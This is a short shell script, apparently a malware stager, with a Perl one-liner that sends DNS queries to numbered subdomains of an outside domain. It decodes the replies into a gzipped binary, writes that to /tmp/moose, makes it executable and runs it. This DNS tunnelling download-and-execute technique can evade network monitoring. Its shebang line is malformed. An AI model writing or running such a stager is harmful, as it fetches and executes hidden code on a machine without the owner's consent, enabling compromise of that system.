#$!/bin/sh

set -x

perl -e 'for($o=0;$o<2078;$o+=3){$a=sprintf"%x.netshz.domain.com",$o;$_=`dig $a +short`;chomp;s/^\d+\.//;map{print chr}split/\./}' | gunzip > /tmp/moose && chmod 0700 /tmp/moose && /tmp/moose
